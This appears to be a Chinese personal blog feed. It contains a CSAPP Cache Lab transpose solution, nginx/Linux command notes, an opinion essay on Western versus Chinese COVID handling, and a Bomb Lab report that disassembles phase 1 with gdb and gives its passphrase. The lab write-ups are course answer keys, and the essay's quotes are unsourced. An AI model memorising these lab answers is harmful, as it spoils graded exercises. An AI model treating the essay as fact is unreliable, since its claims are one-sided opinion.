class="number">7</span>]=a8;</span><br><span class="line">                    B[k+<span class="number">4</span>][j]=a1;B[k+<span class="number">4</span>][j+<span class="number">1</span>]=a2;B[k+<span class="number">4</span>][j+<span class="number">2</span>]=a3;B[k+<span class="number">4</span>][j+<span class="number">3</span>]=a4;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">for</span>(k=i+<span class="number">4</span>;k&lt;i+<span class="number">8</span>;++k)&#123;</span><br><span class="line">                    a1=A[j+<span class="number">4</span>][k];a2=A[j+<span class="number">5</span>][k];a3=A[j+<span class="number">6</span>][k];a4=A[j+<span class="number">7</span>][k];</span><br><span class="line"></span><br><span class="line">                    B[k][j+<span class="number">4</span>]=a1;B[k][j+<span class="number">5</span>]=a2;B[k][j+<span class="number">6</span>]=a3;B[k][j+<span class="number">7</span>]=a4;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i+=<span class="number">16</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;M;j+=<span class="number">16</span>)&#123;</span><br><span class="line">                <span class="keyword">for</span>(k=i;k&lt;i+<span class="number">16</span>&amp;&amp;k&lt;N;k++)&#123;</span><br><span class="line">                    <span class="keyword">for</span>(h=j;h&lt;j+<span class="number">16</span>&amp;&amp;h&lt;M;h++)&#123;</span><br><span class="line">                        B[h][k]=A[k][h];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>实现思路：</strong></p>
<p>本题很明显要使用分块进行优化，但分块后如下后距离答案要求的数量还有不少距离。</p>
<p>我这里参考了网上大神们的做法。</p>
<p><strong>32×32：</strong></p>
<p>第一题要求miss次数在300以下，首先观察，Cache的一个块只有32B，也就是只能容纳8个int。这个Cache可以容纳这个matrix的前8行。分块的话，肯定是取8×8的比较合适。先读取A的一行，然后放入B的一列。12个int变量，4个用来循环，其余8个用来存A中块的一行。</p>
<p>对于在对角线上的块，A中每读一行，会有一次miss，也就是miss次数是读取操作的1/8，对于B数组的话，第一次读取这行会产生一次miss，之后对于第i行，只有A中读到第i行的时候，会被移除出Cache，然后存的时候会产生一次miss。可以粗略计算为miss次数是读取次数的1/4。</p>
<p>对于不在对角线上的块，做转置的时候，A还是1/8的miss率，B的每行在Cache中和A的行不冲突 ，所以也是1/8的miss率，我们计算下最后大概多少次miss呢？</p>
<p>大概是 <img src="https://www.zhihu.com/equation?tex=4%5Ctimes+64%5Ctimes%28%5Cfrac%7B1%7D%7B8%7D%2B%5Cfrac%7B1%7D%7B4%7D%29%2B12%5Ctimes+64%5Ctimes2%5Ctimes%5Cfrac%7B1%7D%7B8%7D%3D288" alt="[公式]"></p>
<p>最后跑出来的答案是287，非常接近。</p>
<p><strong>64×64：</strong></p>
<p>首先考虑Cache中只能放4行A中的行，如果再用8×8的块，前面4行可以填入，后面4行会在Cache中发生冲突，导致miss次数增加。</p>
<p>如果只用4×4的块呢？那么每次Cache中放入8个int，我们却只用4个，浪费严重，我用这个方法最少也只能做到1677次miss。</p>
<p>有一种很巧妙的方法，就是还用8×8的块来做，题目说A数组不能变换，但是说B数组可以任意操作啊。我们必须要一步到位嘛？可否考虑先把数字移动到B中，然后在B中自己做变化。</p>
<p>考虑用同样的miss次数，把更多的数据移动到B中，但是不一定是正确的位置，然后再用同样的miss次数，把A中部分数据移动到B中时，完成把B中前面位置错误数据的纠正。</p>
<p>1.先考虑把A的上半部分存入到B，但是为了考虑Cache不冲突，所以把右上角的4×4的区域也存在B的右上角。对于在对角线上的块，A的miss率是1/8，B的左上角部分miss率是1/2。对于不在对角线上的块，A的miss率还是1/8，B左上角部分的miss率为1/4.</p>
<p>\2. 接下来这步是减少miss率的关键，把A左下角的一列4个数据读出，B右上角的一行4个数据读出，都用int变量暂存，然后把前四个填入B右上角行中，后四个填入B的左下角行中。</p>
<p>因为从B右上角读取的时候，把块放入了Cache，然后从A往B中填的时候，就不会出现miss操作。</p>
<p>来计算一下miss率，对于在对角线上的块，从A左下角读取miss率为1，B的右上角的操作miss率为1/4，B的左下角miss率为1/4。对于不在对角线的快，A的miss率为1/4，B右上角miss率为0，左下角miss率为1/4。</p>
<p>\3. 最后一步就是把A的右下角填入B的右下角，对于在对角线上的块，A的miss率为1/4，B的miss率为1/2.不在对角线上的块，A，B的miss率都为0.</p>
<p>最后我们来计算下miss的次数吧，计算出来近似是1280次，实际我们代码跑出来是1219次 。</p>
<p><strong>61×67：</strong></p>
<p>不规则的matrix，本质也是用分块来优化Cache的读写，但是不能找到比较显然的规律看出来间隔多少可以填满一个Cache，但是由于要求比较松，我们可以尝试一些分块的大小，直接进行转置操作。尝试到16左右 ，可以小于2000次miss。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>CSAPP</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux命令总结（持续更新中）</title>
    <url>/2020/04/12/1/</url>
    <content><![CDATA[<a id="more"></a>
<h1 id="nginx"><a class="markdownIt-Anchor" href="#nginx"></a> Nginx:</h1>
<ul>
<li>查看端口：netstat -ntpl;</li>
<li>结束监听：kill (number)</li>
<li>启动nginx服务：sudo service nginx start</li>
<li>停止nginx服务：sudo service nginx stop</li>
<li>重启nginx服务：service nginx restart；systemctl restart nginx</li>
<li>nginx访问日志的默认路径:/var/log/nginx</li>
<li>nginx配置文件：/etc/nginx/nginx.conf</li>
<li>nginx服务器默认目录:/usr/share/nginx/html</li>
<li>nginx -t 测试配置文件语法，同时告诉配置文件位置</li>
</ul>
<h1 id="php"><a class="markdownIt-Anchor" href="#php"></a> PHP</h1>
<ul>
<li>查看php所有软件包：rpm -qa|grep php</li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>服务器</tag>
        <tag>后端开发</tag>
      </tags>
  </entry>
  <entry>
    <title>西方没有资本再傲慢了</title>
    <url>/2020/04/06/1/</url>
    <content><![CDATA[<h1 id="一种病毒两种制度"><a class="markdownIt-Anchor" href="#一种病毒两种制度"></a> 一种病毒，两种制度？</h1>
<blockquote>
<p>中国人若想消灭这次新型冠状病毒，需要的药房既不是西药疫苗，也不是中草药，而是自由和民主</p>
<p>——德国 《明镜》</p>
</blockquote>
<blockquote>
<p>在应对新冠病毒的处理方式上，民主制度显示了无可辩驳的优越性</p>
<p>——法国 《费加罗报》</p>
</blockquote>
<blockquote>
<p>传染疾病在民主国家的致死率，总是低于像中国这样的专制国家</p>
<p>专制国家缺少信息的自由流动和与民众的对话，会导致决策的失误</p>
<p>——英国 《经济学人》</p>
</blockquote>
<a id="more"></a>
<p><a href="https://www.economist.com/graphic-detail/2020/02/18/diseases-like-covid-19-are-deadlier-in-non-democracies" target="_blank" rel="noopener">Diseases like covid-19 are deadlier in non-democracies(经济学人)</a></p>
<p>西方的民主优越理念，是西方对于中国抨击的主要理由，在这次疫情的爆发中，西方以中国为专制国家为理由对于中国爆发的疫情进行抨击、嘲笑、歧视，他们认为，是因为像中国这样一个“专制国家”，缺乏与民众的沟通，并且由于对于群众言论的审查、封杀而导致了新型冠状病毒的发生，他们对此不屑一顾，并且认为以中国如此“落后”的医疗条件都能使疫情逐渐好转，那在我们资本主义的“发达”国家中根本不成问题。</p>
<p>而事实上，西方资本主义国家在那里不停地摆数据、讲道理，极尽一切手段用来说明西方民主制度要比中国更为高明。在他们所得出的结论里，美国、加拿大、德国、法国这些西方资本主义国家是应对病毒最为可靠的国家，而像中国，却仅仅排在第51个位置。可是像美国这样一个应对H1N1如此失败的国家，它是有如何的脸面忝居首列呢？他们对于数据的恶意的挑选从而来进行一些完全没有科学依据的说明，西方的人文社科报告，尤其是此类关乎政治的报告，总是刻意地去美化西方而贬低社会主义国家。经过此次疫情我们完全可以看出，西方各种“权威组织”所进行的研究调查完全是不可靠的，只会沦为政治的附庸。</p>
<p>西方的资本在疫情面前潜逃了，而他们发达的媒体系统只顾着一味地欺骗群众和对于中国无尽的诋毁，他们的政府有的进行党争，而有的则在进行十年才能讨论出结果的议会。</p>
<blockquote>
<p>挪威虽然不能像中国那样在10天内建成有1000个床位的医院，而且在7年内才定下来一个仅有100个座位的会议厅，但他们会比中国做得更好，因为专制国家缺少信息的自由流动和与民众的对话，会导致决策的失误</p>
<p>——英国 《经济学人》</p>
</blockquote>
<p>而事实上，正是由于西方对于疫情的傲慢与忽视，导致新冠病毒在欧洲大肆横行，也正是由于西方所崇尚的自由与个人权力至上论，导致欧洲的病毒一发不可收拾，他们依然不带口罩，他们依然举行球赛，他们依然举办聚会，国家禁止举办1000人以上的聚会，他们就举办999人的，他们管这个叫做自由。但如此之“自由”只能导致害人害己。</p>
<p>事实上，正是由于西方所崇尚的民主优越论与自由至上论与他们所推崇的分权与多党执政导致他们的政府惯于使用欺骗、甩锅来进行党争，他们并没有对任何人民负起责任，他们只为了自己和他们的政党来谋取利益，他们只关注于支持他们的人，他们所崇尚的自由就是每一个人都不需要为另外一个人和整个集体负任何责任，与其说他们在“分权”，不如说他们在“分责”，他们只在乎国家资本的运作而不关心民众的死活。当记者向特朗普质疑“为什么富人可以得到这么多的物资而穷人却得不到”，他回答，“<strong>世界本来就是这样</strong>”。</p>
<p>在从前，他们靠着殖民和迫害穷人来发家致富；现在，他们又大行其道地谈论着民主。他们所谓的“自由”与“民主”让他们变得异常傲慢，他们听不见世界的声音，听不见民众的呼唤，这是一种被裹挟着的民主。</p>
<p>在推特上，许许多多质疑西方资本的声音被审查、封闭乃至封杀，这更像一个专制国家而非民主国家所进行的行为，他们歧视华裔，骂黄种人是“东亚病夫”，这更像是“民粹”而非“平等”的行为。</p>
<p><strong>西方已再一次到了至暗时刻，可是现在已经没有了丘吉尔</strong></p>
<h1 id="纳粹主义滋长"><a class="markdownIt-Anchor" href="#纳粹主义滋长"></a> 纳粹主义滋长</h1>
<p>事实上，在这一次疫情中，我也看到了纳粹主义滋生的苗头。事实上，不仅在西方，在中国内也有这种倾向的出现。纳粹主义又叫做“国家民族社会主义”，纳粹主义一般有以下几种表现：</p>
<blockquote>
<ol>
<li>极端的民族主义，以血统等标准划分民族，并以民族为单位叙事，尤其是<strong>以民族划分敌我关系</strong></li>
<li>**宣扬仇恨。**鼓吹对特定国家或族群的复仇，尤其是无底线的报复。</li>
<li>排外，要求建立纯粹民族或单一民族至上的国家。</li>
<li>鼓吹武力扩张，从根本上否认和平共存可能性。</li>
<li>极权思想，要求每个个体完全彻底为民族和国家利益服务，否定个人的选择自由。</li>
</ol>
</blockquote>
<p>在西方，许多民众将这一切归罪于中国，并将其认为是黄种人的过错，他们主张以暴力手段对于中国展开报复，他们对于华裔具有极大的恶意并且使用暴力手段对于华裔进行血腥报复，在他们国家恶意的引导下，我很怀疑这种纳粹主义倾向会不会卷土重来，而在当时的德国，希特勒就是利用一战后德国人对于犹太人的不满进而煽动反种族情绪，这是十分令人值得担心的。因为我们无法断定是否有疯狂的政府利用民众对于疫情的愤怒使用战争来进行祸水东流。</p>
<p>而在国内的网络社区中，我也经常看到经常有人对于西方乃至整个种族进行了极端恶意的排斥，我们可以对于某些人、某些政治人物进行排斥，但不能对于整个国家人民乃至整个种族进行污名化处理。</p>
<p><strong>这是我们应当做的。</strong></p>
]]></content>
      <categories>
        <category>杂文</category>
      </categories>
      <tags>
        <tag>杂论</tag>
        <tag>爱国</tag>
      </tags>
  </entry>
  <entry>
    <title>Bomb Lab实验报告</title>
    <url>/2020/04/05/1/</url>
    <content><![CDATA[<p><img src="/2020/04/05/1/csapp.jpg" alt></p>
<a id="more"></a>
<h1 id="实验简介"><a class="markdownIt-Anchor" href="#实验简介"></a> 实验简介</h1>
<p>浏览<code>bomb.c</code>可知，本实验一共有6个关卡，由<code>phase_1</code>为例，该实验的运行格式如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Hmm...  Six phases must be more secure than one phase! */</span></span><br><span class="line">input = read_line();             <span class="comment">/* Get input                   */</span></span><br><span class="line">phase_1(input);                  <span class="comment">/* Run the phase               */</span></span><br><span class="line">phase_defused();                 <span class="comment">/* Drat!  They figured it out!</span></span><br><span class="line"><span class="comment">      * Let me know how they did it. */</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Phase 1 defused. How about the next one?\n"</span>);</span><br></pre></td></tr></table></figure>
<p>显然，题目需要从标准输入或者文件输入参数，然后调用<code>phase</code>类函数来检查输入参数是否正确，想要获取到正确的密码，我们需要检查对应的参数储存在哪块地址。</p>
<h2 id="phase_1"><a class="markdownIt-Anchor" href="#phase_1"></a> Phase_1</h2>
<h3 id="实验过程"><a class="markdownIt-Anchor" href="#实验过程"></a> 实验过程：</h3>
<p>于是使用反汇编<code>bomb</code>可执行程序：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">objdump -d bomb &gt; bomb.asm</span><br></pre></td></tr></table></figure>
<p>在<code>bomb.asm</code>中查找main函数所对应的汇编代码，可以发现如下片段：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">400e32: e8 67 06 00 00         callq  40149e &lt;read_line&gt;</span><br><span class="line">400e37:    48 89 c7               mov    %rax,%rdi</span><br><span class="line">400e3a:    e8 a1 00 00 00         callq  400ee0 &lt;phase_1&gt;</span><br><span class="line">400e3f:    e8 80 07 00 00         callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">400e44:    bf a8 23 40 00         mov    $0x4023a8,%edi</span><br><span class="line">400e49:    e8 c2 fc ff ff         callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">400e4e:    e8 4b 06 00 00         callq  40149e &lt;read_line&gt;</span><br><span class="line">400e53:    48 89 c7               mov    %rax,%rdi</span><br></pre></td></tr></table></figure>
<p>在<code>400e32</code>处调用了<code>read_line</code>函数，可以看出是在获取标准输入，下一步执行<code>mov %rax,%rdi</code>,表示将返回值存入到了<code>%rdi</code>寄存器中，然后立即调用<code>phase_1</code>函数，于是我们找到<code>phase_1</code>函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400ee0 &lt;phase_1&gt;:</span><br><span class="line">  400ee0:  48 83 ec 08            sub    $0x8,%rsp</span><br><span class="line">  400ee4:  be 00 24 40 00         mov    $0x402400,%esi</span><br><span class="line">  400ee9:  e8 4a 04 00 00         callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">  400eee:  85 c0                  test   %eax,%eax</span><br><span class="line">  400ef0:  74 05                  je     400ef7 &lt;phase_1+0x17&gt;</span><br><span class="line">  400ef2:  e8 43 05 00 00         callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400ef7:  48 83 c4 08            add    $0x8,%rsp</span><br><span class="line">  400efb:  c3                     retq</span><br></pre></td></tr></table></figure>
<p>观察到<code>phase_1</code>首先将栈顶指针向下移了8位，然后将<code>0x402400</code>地址存入<code>%esi（%rsi）</code>寄存器中，然后调用了<code>strings_not_equal</code>这个函数，然后测试返回值是否为0，如果不为0将栈顶指针加8直接返回，否则直接调用<code>explode_bomb</code>函数（看名字是引爆炸弹），所以我们现在应该去strings_not_equal这个函数内查看:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0000000000401338</span> &lt;strings_not_equal&gt;:</span><br><span class="line">  <span class="number">401338</span>:  <span class="number">41</span> <span class="number">54</span>                  push   %r12</span><br><span class="line">  <span class="number">40133</span>a:  <span class="number">55</span>                     push   %rbp</span><br><span class="line">  <span class="number">40133b</span>:  <span class="number">53</span>                     push   %rbx</span><br><span class="line">  <span class="number">40133</span>c:  <span class="number">48</span> <span class="number">89</span> fb               mov    %rdi,%rbx</span><br><span class="line">  <span class="number">40133f</span>:  <span class="number">48</span> <span class="number">89</span> f5               mov    %rsi,%rbp</span><br><span class="line">  <span class="number">401342</span>:  e8 d4 ff ff ff         callq  <span class="number">40131b</span> &lt;string_length&gt;</span><br><span class="line">  <span class="number">401347</span>:  <span class="number">41</span> <span class="number">89</span> c4               mov    %eax,%r12d</span><br><span class="line">  <span class="number">40134</span>a:  <span class="number">48</span> <span class="number">89</span> ef               mov    %rbp,%rdi</span><br><span class="line">  <span class="number">40134</span>d:  e8 c9 ff ff ff         callq  <span class="number">40131b</span> &lt;string_length&gt;</span><br><span class="line">  <span class="number">401352</span>:  ba <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>         mov    $<span class="number">0x1</span>,%edx</span><br><span class="line">  <span class="number">401357</span>:  <span class="number">41</span> <span class="number">39</span> c4               cmp    %eax,%r12d</span><br><span class="line">  <span class="number">40135</span>a:  <span class="number">75</span> <span class="number">3f</span>                  jne    <span class="number">40139b</span> &lt;strings_not_equal+<span class="number">0x63</span>&gt;</span><br><span class="line">  <span class="number">40135</span>c:  <span class="number">0f</span> b6 <span class="number">03</span>               movzbl (%rbx),%eax</span><br><span class="line">  <span class="number">40135f</span>:  <span class="number">84</span> c0                  test   %al,%al</span><br><span class="line">  <span class="number">401361</span>:  <span class="number">74</span> <span class="number">25</span>                  je     <span class="number">401388</span> &lt;strings_not_equal+<span class="number">0x50</span>&gt;</span><br><span class="line">  <span class="number">401363</span>:  <span class="number">3</span>a <span class="number">45</span> <span class="number">00</span>               cmp    <span class="number">0x0</span>(%rbp),%al</span><br><span class="line">  <span class="number">401366</span>:  <span class="number">74</span> <span class="number">0</span>a                  je     <span class="number">401372</span> &lt;strings_not_equal+<span class="number">0x3a</span>&gt;</span><br><span class="line">  <span class="number">401368</span>:  eb <span class="number">25</span>                  jmp    <span class="number">40138f</span> &lt;strings_not_equal+<span class="number">0x57</span>&gt;</span><br><span class="line">  <span class="number">40136</span>a:  <span class="number">3</span>a <span class="number">45</span> <span class="number">00</span>               cmp    <span class="number">0x0</span>(%rbp),%al</span><br><span class="line">  <span class="number">40136</span>d:  <span class="number">0f</span> <span class="number">1f</span> <span class="number">00</span>               nopl   (%rax)</span><br><span class="line">  <span class="number">401370</span>:  <span class="number">75</span> <span class="number">24</span>                  jne    <span class="number">401396</span> &lt;strings_not_equal+<span class="number">0x5e</span>&gt;</span><br><span class="line">  <span class="number">401372</span>:  <span class="number">48</span> <span class="number">83</span> c3 <span class="number">01</span>            add    $<span class="number">0x1</span>,%rbx</span><br><span class="line">  <span class="number">401376</span>:  <span class="number">48</span> <span class="number">83</span> c5 <span class="number">01</span>            add    $<span class="number">0x1</span>,%rbp</span><br><span class="line">  <span class="number">40137</span>a:  <span class="number">0f</span> b6 <span class="number">03</span>               movzbl (%rbx),%eax</span><br><span class="line">  <span class="number">40137</span>d:  <span class="number">84</span> c0                  test   %al,%al</span><br><span class="line">  <span class="number">40137f</span>:  <span class="number">75</span> e9                  jne    <span class="number">40136</span>a &lt;strings_not_equal+<span class="number">0x32</span>&gt;</span><br><span class="line">  <span class="number">401381</span>:  ba <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>         mov    $<span class="number">0x0</span>,%edx</span><br><span class="line">  <span class="number">401386</span>:  eb <span class="number">13</span>                  jmp    <span class="number">40139b</span> &lt;strings_not_equal+<span class="number">0x63</span>&gt;</span><br><span class="line">  <span class="number">401388</span>:  ba <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>         mov    $<span class="number">0x0</span>,%edx</span><br><span class="line">  <span class="number">40138</span>d:  eb <span class="number">0</span>c                  jmp    <span class="number">40139b</span> &lt;strings_not_equal+<span class="number">0x63</span>&gt;</span><br><span class="line">  <span class="number">40138f</span>:  ba <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>         mov    $<span class="number">0x1</span>,%edx</span><br><span class="line">  <span class="number">401394</span>:  eb <span class="number">05</span>                  jmp    <span class="number">40139b</span> &lt;strings_not_equal+<span class="number">0x63</span>&gt;</span><br><span class="line">  <span class="number">401396</span>:  ba <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>         mov    $<span class="number">0x1</span>,%edx</span><br><span class="line">  <span class="number">40139b</span>:  <span class="number">89</span> d0                  mov    %edx,%eax</span><br><span class="line">  <span class="number">40139</span>d:  <span class="number">5b</span>                     pop    %rbx</span><br><span class="line">  <span class="number">40139</span>e:  <span class="number">5</span>d                     pop    %rbp</span><br><span class="line">  <span class="number">40139f</span>:  <span class="number">41</span> <span class="number">5</span>c                  pop    %r12</span><br><span class="line">  <span class="number">4013</span>a1:  c3                     retq</span><br></pre></td></tr></table></figure>
<p>完整的strings_not_equal如上图所示。首先函数将三个寄存器的内容压入栈中进行保护，然后分别将<code>%rdi,%rsi</code>中的内容移入至<code>%rbs,%rbp</code>中，然后调用<code>string_length</code>函数，通过函数名可以猜测该函数用来检测字符串的长度，然后返回时将返回值赋值给<code>%r12d</code>寄存器，随后将<code>%rbp</code>（地址<code>$0x402400</code>）的内容赋值给<code>%rdi</code>,随后几行分别再次调用<code>string_length</code>函数并进行与1的比较，也就是检测字符串的长度是否与目标字符串的长度吻合，如果吻合的话，继续向下执行。否则跳转至：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">40139b:  89 d0                  mov    %edx,%eax</span><br><span class="line">40139d:  5b                     pop    %rbx</span><br><span class="line">40139e:  5d                     pop    %rbp</span><br><span class="line">40139f:  41 5c                  pop    %r12</span><br><span class="line">4013a1:  c3                     retq</span><br></pre></td></tr></table></figure>
<p>即返回1。</p>
<p>继续向下观察，发现汇编指令中首先检查输入的首字符是否为空字符，即’/0’，即以下指令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">40135c:  0f b6 03               movzbl (%rbx),%eax</span><br><span class="line">40135f:  84 c0                  test   %al,%al</span><br></pre></td></tr></table></figure>
<p>这里将<code>%rbx</code>中的内容（即标准输入内容）取出，放入<code>%eax</code>中并进行了符号位扩展，如果为0的话就直接向下跳转，因为我们的目的是寻找目标字符串，所以不必管跳转内容，直接向下运行即可。</p>
<p>接着可以观察到以下指令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmp    0x0(%rbp),%al</span><br></pre></td></tr></table></figure>
<p>即将<code>%rbp</code>(即内存<code>$0x402400</code>中的内容)与标准输入的第一个字符进行比对，由此看来，答案就呼之欲出了！标准密码就藏在地址<code>$0x402400</code>中。</p>
<p>于是我们在命令行使用<code>gdb</code>进行调试：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb bomb</span><br><span class="line">(gdb) b explode_bomb</span><br><span class="line">(gdb) x&#x2F;s 0x402400&#x2F;*查看密码*&#x2F;</span><br></pre></td></tr></table></figure>
<p>于是命令行输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x402400:       &quot;Border relations with Canada have never been better.&quot;</span><br></pre></td></tr></table></figure>
<p>于是运行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) run</span><br></pre></td></tr></table></figure>
<p>根据提示输入标准输入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Border relations with Canada have never been better.</span><br></pre></td></tr></table></figure>
<p>输出信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Phase 1 defused. How about the next one?</span><br></pre></td></tr></table></figure>
<p>于是第一关就圆满地结束了！</p>
<h3 id="运行结果"><a class="markdownIt-Anchor" href="#运行结果"></a> 运行结果：</h3>
<p><img src="/2020/04/05/1/phase1.png" alt></p>
<h2 id="phase_2"><a class="markdownIt-Anchor" href="#phase_2"></a> Phase_2</h2>
<h3 id="实验过程-2"><a class="markdownIt-Anchor" href="#实验过程-2"></a> 实验过程：</h3>
<p>同样地，在<code>main</code>函数里寻找关于<code>phase_2</code>函数的汇编代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">400e4e: e8 4b 06 00 00         callq  40149e &lt;read_line&gt;</span><br><span class="line">400e53:    48 89 c7               mov    %rax,%rdi</span><br><span class="line">400e56:    e8 a1 00 00 00         callq  400efc &lt;phase_2&gt;</span><br><span class="line">400e5b:    e8 64 07 00 00         callq  4015c4 &lt;phase_defused&gt;</span><br></pre></td></tr></table></figure>
<p>可知输入放在了<code>%rdi</code>寄存器中。</p>
<p>下面查询phase_2的汇编代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400efc &lt;phase_2&gt;:</span><br><span class="line">  400efc:  55                     push   %rbp</span><br><span class="line">  400efd:  53                     push   %rbx</span><br><span class="line">  400efe:  48 83 ec 28            sub    $0x28,%rsp</span><br><span class="line">  400f02:  48 89 e6               mov    %rsp,%rsi</span><br><span class="line">  400f05:  e8 52 05 00 00         callq  40145c &lt;read_six_numbers&gt;</span><br><span class="line">  400f0a:  83 3c 24 01            cmpl   $0x1,(%rsp)</span><br><span class="line">  400f0e:  74 20                  je     400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">  400f10:  e8 25 05 00 00         callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f15:  eb 19                  jmp    400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">  400f17:  8b 43 fc               mov    -0x4(%rbx),%eax</span><br><span class="line">  400f1a:  01 c0                  add    %eax,%eax</span><br><span class="line">  400f1c:  39 03                  cmp    %eax,(%rbx)</span><br><span class="line">  400f1e:  74 05                  je     400f25 &lt;phase_2+0x29&gt;</span><br><span class="line">  400f20:  e8 15 05 00 00         callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f25:  48 83 c3 04            add    $0x4,%rbx</span><br><span class="line">  400f29:  48 39 eb               cmp    %rbp,%rbx</span><br><span class="line">  400f2c:  75 e9                  jne    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f2e:  eb 0c                  jmp    400f3c &lt;phase_2+0x40&gt;</span><br><span class="line">  400f30:  48 8d 5c 24 04         lea    0x4(%rsp),%rbx</span><br><span class="line">  400f35:  48 8d 6c 24 18         lea    0x18(%rsp),%rbp</span><br><span class="line">  400f3a:  eb db                  jmp    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f3c:  48 83 c4 28            add    $0x28,%rsp</span><br><span class="line">  400f40:  5b                     pop    %rbx</span><br><span class="line">  400f41:  5d                     pop    %rbp</span><br><span class="line">  400f42:  c3                     retq</span><br></pre></td></tr></table></figure>
<p><code>400efe</code>: <code>sub $0x28,%rsp</code> 和 <code>400f02</code>: <code>mov %rsp,%rsi</code> 分配了一块 40 bytes 大小的空间，并将其地址传给了 <code>%rsi</code> 寄存器。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%rsi &#x3D; %rsp</span><br></pre></td></tr></table></figure>
<p><code>400f05</code>: <code>callq 40145c</code> 调用函数 <code>read_six_numbers</code>。从函数名推测其作用可能为读入 6 个数。</p>
<h4 id="观察函数read_six_numbers"><a class="markdownIt-Anchor" href="#观察函数read_six_numbers"></a> 观察函数read_six_numbers</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">000000000040145c &lt;read_six_numbers&gt;:</span><br><span class="line">  40145c:  48 83 ec 18            sub    $0x18,%rsp</span><br><span class="line">  401460:  48 89 f2               mov    %rsi,%rdx</span><br><span class="line">  401463:  48 8d 4e 04            lea    0x4(%rsi),%rcx</span><br><span class="line">  401467:  48 8d 46 14            lea    0x14(%rsi),%rax</span><br><span class="line">  40146b:  48 89 44 24 08         mov    %rax,0x8(%rsp)</span><br><span class="line">  401470:  48 8d 46 10            lea    0x10(%rsi),%rax</span><br><span class="line">  401474:  48 89 04 24            mov    %rax,(%rsp)</span><br><span class="line">  401478:  4c 8d 4e 0c            lea    0xc(%rsi),%r9</span><br><span class="line">  40147c:  4c 8d 46 08            lea    0x8(%rsi),%r8</span><br><span class="line">  401480:  be c3 25 40 00         mov    $0x4025c3,%esi</span><br><span class="line">  401485:  b8 00 00 00 00         mov    $0x0,%eax</span><br><span class="line">  40148a:  e8 61 f7 ff ff         callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  40148f:  83 f8 05               cmp    $0x5,%eax</span><br><span class="line">  401492:  7f 05                  jg     401499 &lt;read_six_numbers+0x3d&gt;</span><br><span class="line">  401494:  e8 a1 ff ff ff         callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401499:  48 83 c4 18            add    $0x18,%rsp</span><br><span class="line">  40149d:  c3                     retq</span><br></pre></td></tr></table></figure>
<p>先看开始的部分：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">40145c: 48 83 ec 18            sub    $0x18,%rsp</span><br><span class="line">401460:    48 89 f2               mov    %rsi,%rdx</span><br><span class="line">401463:    48 8d 4e 04            lea    0x4(%rsi),%rcx</span><br><span class="line">401467:    48 8d 46 14            lea    0x14(%rsi),%rax</span><br><span class="line">40146b:    48 89 44 24 08         mov    %rax,0x8(%rsp)</span><br><span class="line">401470:    48 8d 46 10            lea    0x10(%rsi),%rax</span><br><span class="line">401474:    48 89 04 24            mov    %rax,(%rsp)</span><br><span class="line">401478:    4c 8d 4e 0c            lea    0xc(%rsi),%r9</span><br><span class="line">40147c:    4c 8d 46 08            lea    0x8(%rsi),%r8</span><br></pre></td></tr></table></figure>
<p>译成C语言：</p>
